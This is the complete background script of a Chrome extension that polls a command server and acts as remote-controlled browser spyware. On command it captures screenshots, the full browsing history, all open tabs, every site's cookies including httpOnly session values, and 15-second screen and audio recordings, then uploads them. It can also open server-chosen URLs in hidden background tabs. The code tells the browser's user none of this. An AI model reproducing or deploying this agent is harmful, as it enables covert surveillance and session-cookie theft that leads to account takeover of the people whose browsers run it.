// ============ Configuration ============
const SERVER_BASE_URL = 'http://localhost:8080';
let CLIENT_ID = null;
let EXTENSION_ID = null; // Short, memorable ID for easy identification
let CLIENT_NAME = 'Chrome Extension';
let USER_NAME = null;
let isConnected = false;

const POLL_ALARM_NAME = 'pollCommands';
const POLL_INTERVAL_MINUTES = 0.05; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 

// ============ Initialize ============
// Generate or retrieve client ID and extension ID
chrome.storage.local.get(['clientId', 'extensionId', 'clientName', 'userName'], (result) => {
    CLIENT_ID = result.clientId || generateClientId();
    EXTENSION_ID = result.extensionId || generateExtensionId();
    CLIENT_NAME = result.clientName || 'Chrome Extension';
    USER_NAME = result.userName || null;
    
    // Save IDs if they're new
    if (!result.clientId || !result.extensionId) {
        chrome.storage.local.set({ 
            clientId: CLIENT_ID,
            extensionId: EXTENSION_ID
        });
    }
    
    console.log('🔧 Extension initialized');
    console.log('   📱 Extension ID:', EXTENSION_ID);
    console.log('   🔑 Client ID:', CLIENT_ID);
    
    // Start polling
    startPolling();
});

// Generate unique client ID (long, for backend tracking)
function generateClientId() {
    return 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Generate short, memorable extension ID (for easy user identification)
function generateExtensionId() {
    // Generate a random 2-digit number (10-99)
    const randomNum = Math.floor(Math.random() * 90) + 10;
    return `EXT-${randomNum}`;
}

// ============ HTTP Polling with chrome.alarms ============
function startPolling() {
    console.log('🚀 Starting HTTP polling with chrome.alarms...');
    
    // Register immediately
    registerClient();
    
    // Clear any existing alarm
    chrome.alarms.clear(POLL_ALARM_NAME, () => {
        // Create alarm for polling (this works even when service worker is inactive)
        chrome.alarms.create(POLL_ALARM_NAME, {
            delayInMinutes: 0, // Start immediately
            periodInMinutes: POLL_INTERVAL_MINUTES
        });
        console.log('✅ Polling alarm created');
    });
    
    // Also do an immediate poll
    pollForCommands();
}

function stopPolling() {
    chrome.alarms.clear(POLL_ALARM_NAME, () => {
        isConnected = false;
        updatePopupStatus(false);
        console.log('⏹️ Polling stopped');
    });
}

// Listen for alarm events
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === POLL_ALARM_NAME) {
        pollForCommands();
    }
});

// Register with server
async function registerClient() {
    try {
        const response = await fetch(`${SERVER_BASE_URL}/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: CLIENT_ID,
                extensionId: EXTENSION_ID,
                name: CLIENT_NAME,
                userName: USER_NAME
            })
        });

        if (response.ok) {
            const data = await response.json();
            console.log('✅ Registered with server:', data.message);
            isConnected = true;
            updatePopupStatus(true);
        } else {
            console.error('❌ Registration failed:', response.status);
            isConnected = false;
            updatePopupStatus(false);
        }
    } catch (error) {
        console.error('❌ Registration error:', error);
        isConnected = false;
        updatePopupStatus(false);
    }
}

// Poll for commands
async function pollForCommands() {
    if (!CLIENT_ID) {
        console.warn('⚠️ No CLIENT_ID set, skipping poll');
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_BASE_URL}/poll-commands/${CLIENT_ID}`);

        if (response.ok) {
            const data = await response.json();
            
            if (!isConnected) {
                isConnected = true;
                updatePopupStatus(true);
            }

            // Process commands
            if (data.commands && data.commands.length > 0) {
                console.log(`📥 Received ${data.commands.length} command(s)`);
                
                for (const command of data.commands) {
                    await processCommand(command);
                }
            }
        } else if (response.status === 404) {
            // Client not found, re-register
            console.log('⚠️ Client not found, re-registering...');
            await registerClient();
        } else {
            console.error('❌ Polling failed:', response.status);
            isConnected = false;
            updatePopupStatus(false);
        }
    } catch (error) {
        console.error('❌ Polling error:', error.message);
        isConnected = false;
        updatePopupStatus(false);
    }
}

// Process received command
async function processCommand(command) {
    console.log(`⚙️ Processing command: ${command.type}`);

    try {
        switch (command.type) {
            case 'take_screenshot':
                console.log(`📸 Screenshot requested by ${command.requestedBy}`);
                await captureScreenshot(command.id, command.requestedById);
                break;

            case 'get_history':
                console.log(`📜 History requested by ${command.requestedBy}`);
                await captureHistory(command.id, command.requestedById);
                break;

            case 'get_activity':
                console.log(`📊 Activity requested by ${command.requestedBy}`);
                await captureActivity(command.id, command.requestedById);
                break;

            case 'get_cookies':
                console.log(`🍪 Cookies requested by ${command.requestedBy}`);
                await captureCookies(command.id, command.requestedById);
                break;

            case 'start_recording':
                console.log(`🎥 Recording requested by ${command.requestedBy}`);
                await captureRecording(command.id, command.requestedById);
                break;

            case 'open_tabs':
                console.log(`🌐 Open tabs requested by ${command.requestedBy}`);
                await openNewTabs(command.id, command.urls);
                break;

            case 'ping':
                await sendCommandResponse(command.id, 'pong', { message: 'Pong!' });
                console.log('🏓 Pong sent');
                break;

            default:
                console.log(`⚠️ Unknown command type: ${command.type}`);
        }
    } catch (error) {
        console.error('Error processing command:', error);
        await sendCommandResponse(command.id, 'error', { message: error.message });
    }
}

// ============ Screenshot Capture ============
async function captureScreenshot(commandId, userId) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        // Capture the visible tab
        const screenshotUrl = await chrome.tabs.captureVisibleTab(null, {
            format: 'png',
            quality: 100
        });

        console.log('📸 Screenshot captured!');

        // Send to server
        await sendCommandResponse(commandId, 'screenshot', {
            image: screenshotUrl,
            tabTitle: tab.title,
            tabUrl: tab.url
        }, userId);

        console.log('✅ Screenshot sent to server!');

    } catch (error) {
        console.error('Error capturing screenshot:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Browser History Capture ============
async function captureHistory(commandId, userId) {
    try {
        // Get all browser history
        const historyItems = await chrome.history.search({
            text: '',
            startTime: 0,  // Get all history from the beginning
            maxResults: 0  // 0 means no limit, get ALL history items (default is 100)
        });

        console.log(`📜 Browser history captured! (${historyItems.length} entries)`);

        // Send to server
        await sendCommandResponse(commandId, 'history', {
            history: historyItems
        }, userId);

        console.log('✅ History sent to server!');

    } catch (error) {
        console.error('Error capturing history:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Browser Activity Capture ============
async function captureActivity(commandId, userId) {
    try {
        // Get all browser tabs
        const tabs = await chrome.tabs.query({});

        // Extract relevant information from each tab
        const tabsInfo = tabs.map(tab => ({
            id: tab.id,
            title: tab.title,
            url: tab.url,
            active: tab.active,
            pinned: tab.pinned,
            audible: tab.audible,
            discarded: tab.discarded,
            autoDiscardable: tab.autoDiscardable,
            mutedInfo: tab.mutedInfo,
            windowId: tab.windowId,
            index: tab.index
        }));

        console.log(`📊 Browser activity captured! (${tabsInfo.length} tabs)`);

        // Send to server
        await sendCommandResponse(commandId, 'activity', {
            tabs: tabsInfo
        }, userId);

        console.log('✅ Activity sent to server!');

    } catch (error) {
        console.error('Error capturing activity:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Cookies (Browser Cookies) Capture ============
async function captureCookies(commandId, userId) {
    try {
        // Get all browser tabs
        const tabs = await chrome.tabs.query({});
        
        // Get user ID from storage
        const storage = await chrome.storage.local.get(['clientId']);
        const userIdVal = storage.clientId || CLIENT_ID;
        
        let totalCookies = 0;
        const tabsData = [];

        // Get cookies for each tab
        for (const tab of tabs) {
            if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
                continue; // Skip chrome internal pages
            }

            try {
                // Get all cookies for this tab's URL
                const cookies = await chrome.cookies.getAll({ url: tab.url });
                
                // Format cookies
                const formattedCookies = cookies.map(cookie => ({
                    name: cookie.name,
                    value: cookie.value,
                    domain: cookie.domain,
                    path: cookie.path,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    sameSite: cookie.sameSite || 'unspecified',
                    expirationDate: cookie.expirationDate || null,
                    hostOnly: cookie.hostOnly,
                    session: cookie.session
                }));

                totalCookies += formattedCookies.length;

                tabsData.push({
                    url: tab.url,
                    title: tab.title || 'No Title',
                    cookieCount: formattedCookies.length,
                    cookies: formattedCookies
                });
            } catch (error) {
                console.error(`Error getting cookies for tab ${tab.id}:`, error);
            }
        }

        // Format the data according to the specified structure
        const formattedData = {
            userId: userIdVal,
            timestamp: new Date().toISOString(),
            source: "popup",
            totalTabs: tabsData.length,
            totalCookies: totalCookies,
            tabs: tabsData
        };

        console.log(`🍪 Cookies data captured! (${totalCookies} cookies across ${tabsData.length} tabs)`);

        // Send to server
        await sendCommandResponse(commandId, 'cookies', {
            cookiesData: formattedData
        }, userId);

        console.log('✅ Cookies data sent to server!');

    } catch (error) {
        console.error('Error capturing cookies:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Open New Tabs ============
async function openNewTabs(commandId, urls) {
    try {
        if (!urls || urls.length === 0) {
            throw new Error('No URLs provided');
        }

        console.log(`🌐 Opening ${urls.length} tab(s) in background...`);
        
        // Get the current active tab to restore focus later if needed
        const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
        const openedTabs = [];

        // Open each URL in a new background tab
        for (let i = 0; i < urls.length; i++) {
            const url = urls[i];
            
            try {
                // Create new tab in background (active: false keeps user on current tab)
                const newTab = await chrome.tabs.create({
                    url: url,
                    active: false  // This keeps the tab in background
                });
                
                openedTabs.push({
                    url: url,
                    tabId: newTab.id,
                    title: newTab.title || 'Loading...'
                });
                
                console.log(`✅ Tab ${i + 1}/${urls.length} opened: ${url}`);
                
                // Small delay between tabs to avoid overwhelming the browser
                if (i < urls.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            } catch (error) {
                console.error(`❌ Failed to open ${url}:`, error.message);
                openedTabs.push({
                    url: url,
                    error: error.message
                });
            }
        }

        // Send success response
        await sendCommandResponse(commandId, 'tabs_opened', {
            totalRequested: urls.length,
            successfullyOpened: openedTabs.filter(t => !t.error).length,
            tabs: openedTabs,
            currentTab: activeTab ? { url: activeTab.url, title: activeTab.title } : null
        });

        console.log(`✅ ${openedTabs.filter(t => !t.error).length}/${urls.length} tabs opened successfully!`);

    } catch (error) {
        console.error('Error opening tabs:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message });
    }
}

// ============ Screen Recording Capture ============
async function captureRecording(commandId, userId) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        console.log('🎥 Starting screen recording...');

        // Inject content script to handle recording with screen picker
        await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: async (cmdId, tabInfo, usrId) => {
                try {
                    console.log('🎥 [Content] Starting recording...');
                    
                    // Request display media (shows screen picker to user)
                    const stream = await navigator.mediaDevices.getDisplayMedia({
                        video: {
                            width: { ideal: 1920 },
                            height: { ideal: 1080 },
                            frameRate: { ideal: 30 }
                        },
                        audio: true
                    });

                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm;codecs=vp8,opus',
                        videoBitsPerSecond: 1500000
                    });

                    const chunks = [];

                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    mediaRecorder.onstop = async () => {
                        stream.getTracks().forEach(t => t.stop());
                        
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = () => {
                            chrome.runtime.sendMessage({
                                type: 'recording-data',
                                commandId: cmdId,
                                video: reader.result,
                                size: blob.size,
                                tabTitle: tabInfo.title,
                                tabUrl: tabInfo.url,
                                userId: usrId
                            });
                        };
                        
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    console.log('🎥 [Content] Recording started for 15s...');

                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 15000);

                } catch (err) {
                    chrome.runtime.sendMessage({
                        type: 'recording-error',
                        commandId: cmdId,
                        error: err.message,
                        userId: usrId
                    });
                }
            },
            args: [commandId, { title: tab.title, url: tab.url }, userId]
        });

        console.log('🎥 Recording script injected, user will see screen picker...');

    } catch (error) {
        console.error('Error starting recording:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// Ensure offscreen document exists
async function ensureOffscreenDocument() {
    const existingContexts = await chrome.runtime.getContexts({
        contextTypes: ['OFFSCREEN_DOCUMENT'],
        documentUrls: [chrome.runtime.getURL('offscreen-recording.html')]
    });

    if (existingContexts.length > 0) {
        return;
    }

    await chrome.offscreen.createDocument({
        url: 'offscreen-recording.html',
        reasons: ['USER_MEDIA'],
        justification: 'Recording screen video with audio'
    });
    
    console.log('🎥 Offscreen document created');
}

// Handle recording data from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'recording-data') {
        handleRecordingData(message);
    } else if (message.type === 'recording-error') {
        handleRecordingError(message);
    }
});

async function handleRecordingData(message) {
    try {
        console.log(`🎥 Recording received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB`);

        await sendCommandResponse(message.commandId, 'recording', {
            video: message.video,
            tabTitle: message.tabTitle,
            tabUrl: message.tabUrl,
            duration: 15,
            size: message.size
        }, message.userId);

        console.log('✅ Recording sent to server!');
    } catch (error) {
        console.error('Error sending recording:', error);
        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
    }
}

async function handleRecordingError(message) {
    console.error('🎥 Recording error:', message.error);
    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
}


// ============ Send Command Response ============
async function sendCommandResponse(commandId, type, data, userId = null) {
    try {
        const response = await fetch(`${SERVER_BASE_URL}/command-response`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: CLIENT_ID,
                extensionId: EXTENSION_ID,
                commandId: commandId,
                type: type,
                data: data,
                userId: userId
            })
        });

        if (!response.ok) {
            console.error('❌ Failed to send response:', response.status);
        }
    } catch (error) {
        console.error('❌ Error sending response:', error);
    }
}

// ============ Helper Functions ============
function updatePopupStatus(connected) {
    chrome.runtime.sendMessage({
        type: 'status_update',
        connected: connected,
        serverUrl: SERVER_BASE_URL,
        clientId: CLIENT_ID,
        extensionId: EXTENSION_ID
    }).catch(() => {
        // Popup not open, ignore
    });
}

// ============ Message Handling from Popup ============
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    switch (request.type) {
        case 'get_status':
            sendResponse({
                connected: isConnected,
                serverUrl: SERVER_BASE_URL,
                clientName: CLIENT_NAME,
                clientId: CLIENT_ID,
                extensionId: EXTENSION_ID
            });
            break;

        case 'register_user':
            // Store user name
            USER_NAME = request.userName;
            chrome.storage.local.set({ userName: USER_NAME });
            
            // Re-register with server to update user name
            registerClient();
            
            console.log('✅ User registered:', USER_NAME);
            sendResponse({ success: true });
            break;

        case 'connect':
            CLIENT_NAME = request.clientName || CLIENT_NAME;
            
            // Save settings
            chrome.storage.local.set({
                clientName: CLIENT_NAME
            });

            // Restart polling
            startPolling();
            sendResponse({ success: true });
            break;

        case 'disconnect':
            stopPolling();
            sendResponse({ success: true });
            break;

        case 'test_screenshot':
            captureScreenshot('manual_test');
            sendResponse({ success: true });
            break;
    }
    return true;
});